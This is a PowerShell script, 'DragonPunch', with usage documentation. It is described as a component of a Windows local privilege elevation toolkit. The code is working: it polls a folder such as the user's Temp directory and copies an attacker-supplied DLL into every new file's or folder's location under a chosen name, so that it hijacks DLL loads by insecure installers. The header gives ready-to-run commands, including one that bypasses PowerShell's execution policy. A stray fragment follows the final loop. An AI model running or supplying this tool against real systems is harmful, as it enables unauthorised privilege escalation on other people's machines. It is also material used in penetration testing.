<#


Summary
A component of Windows 7.x, 8.x, and 10.x Local Elevation of Attacker's Privileges Toolkit (LEAP) by Greg Linares of CyberPoint SRT Team
Dragon Punch is designed to defeat race or time sensitive conditional privilege elevation attacks in which a small window of opportunity is available for an attacker to plant a binary in order to gain higher privileges.
Example situations would be when an insecure installation application is downloading to a temporary folder and if the attacker can plant a malicious binary in this folder before the installer is finished to trigger an exploitable condition.
Dragon Punch will monitor a folder for the creation of any new files and then drop a malicious binary into the folder where the new file was created.
 
Usage
Powershell -ExecutionPolicy Bypass -File DragonPunch.ps1 -Path C:\Users\User\AppData\Local\Temp\ -Filter * -Recurse -Interval 1500 -File C:\tools\LEAP\bin\LEAPInject.dll -Target DragonPlugin.dll
 
Command Line Arguments
DragonPunch.ps1 -PATH <string:FullPath> -FILTER <string> -RECURSE -INTERVAL <int> -File <string:FullFileName> -Target <string:Filename>
 
PATH
The folder to monitor for changes.  Full Path name is required.  For directories with spaces, place the entire path in double quotes (") to fully resolve:
example: -Path "C:\Users\Administrator\AppData\Roaming\Windows\Start Menu\"

FILTER
A string representing a file or folder name mask to trigger the hijacking attempt. By default this value is set to '*' (All Files and folders)
examples:
-Filter *.pdf - this will trigger on the creation or modification of any files with a file name containing ".pdf" within the folder specified by PATH

RECURSE
This is a flag to monitor the PATH specified folder recursively (include all subfolders) or just limit monitoring to the folder specified by PATH
By default this value is set to false

INTERVAL
the amount of time in milliseconds DragonPunch will sleep between checking PATH for activity,  The lower this number the more of a performance hit the system will encounter however the more intensive the monitoring will be.
The default time is 1500 milliseconds

FILE
The file that DragonPunch will copy to the monitor PATH (and subdirectories if RECURSE is set) in hopes to hijack or overwrite another file so that a user can elevate their privileges.
By default DragonPunch will use ..\bin\LEAPInject.dll as the default file for injection

TARGET
This is the filename that DragonPunch is hoping to hijack using the file specified by FILE in the monitored folder specified by PATH.
example: 
DragonPunch.ps1 ... -File C:\tools\LEAP\bin\LEAPInject.dll -Target DragonPlugin.dll
this will copy C:\tools\bin\LEAPInject.dll to the monitored folder as DragonPlugin.dll
 
Usage Scenario
If an application is downloading and loading the file "TrustedInstaller.dll" from a randomly generated subfolder within the current user's temp folder, DragonPunch can be execute with the following parameters in order to attempt to exploit this:
DragonPunch.ps1 -Path C:\Users\User\AppData\Local\Temp\ -Filter * -Recurse -File C:\tools\LEAP\bin\LEAPInject.dll -Target TrustedInstaller.dll
 
#>

Param
(
    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [ValidateScript({
        if(!(Test-Path  $_ -PathType Container))
        {
            throw "Input folder doesn't exist: $_"
        }
        $true
    })]
    [ValidateNotNullOrEmpty()]
    [string]$Path = (Get-Location -PSProvider FileSystem).Path,

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [string]$Filter = '*',

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [switch]$Recurse,

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [int]$Interval = 1500,

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [string]$File = $(Split-Path $MyInvocation.MyCommand.Path -Parent) + "\bin\LEAPInject.dll",

    [Parameter(ValueFromPipelineByPropertyName = $true)]
    [string]$Target = $(Split-Path $File -Leaf)

)

if (!(Test-Path $File))
{
    throw "Error: $File does not exist."  
}

[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")

$objNotifyIcon = New-Object System.Windows.Forms.NotifyIcon 

$MyPath = Get-Process -id $pid | Select-Object -ExpandProperty Path
$objNotifyIcon.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($MyPath)
$objNotifyIcon.BalloonTipIcon = "Info" 
$objNotifyIcon.BalloonTipText = "Monitoring the Folder: $Path to drop: $Target" 
$objNotifyIcon.BalloonTipTitle = "LEAP Toolkit"
 
$objNotifyIcon.Visible = $True 
$objNotifyIcon.ShowBalloonTip(8000)


$GetFileList = {Get-ChildItem  -LiteralPath $Path -Filter $Filter -Recurse:$Recurse -Force}

Write-Host "Getting initial list of files at $Path" -ForegroundColor Green
$OldFileList = @(. $GetFileList)
do
{
    $NewFileSet = @(. $GetFileList)
    Compare-Object -ReferenceObject $OldFileList -DifferenceObject $NewFileSet -Property Name, CreationTime -PassThru |
        Where-Object { $_.SideIndicator -eq '=>' } |
            ForEach-Object {
                if (Test-Path $_.FullName -PathType Container)
                {
                    $Victim = $_.FullName + "\"
                    Write-Host "Detected new folder: $Victim" -ForegroundColor Red
                    Copy-Item $File $($Victim + "\" + $Target) -Force
                    Write-Host "Dropped $Target @ $Victim" -ForegroundColor Red
                }
                else
                {
                    $Victim = Split-Path $_.FullName -Leaf  
                    if (!($Victim.Equals($Target)))
                    {
                        $Victim = Split-Path $_.FullName -Parent
                        Write-Host "Detected new file: $($_.FullName)" -ForegroundColor Red
                        Copy-Item $File $($Victim + "\" + $Target) -Force
                        Write-Host "Dropped $Target @ $Victim" -ForegroundColor Red
                    }
                }
            }

    $OldFileList = $NewFileSet
    Start-Sleep -MilliSeconds $Interval
}
while($true)riber
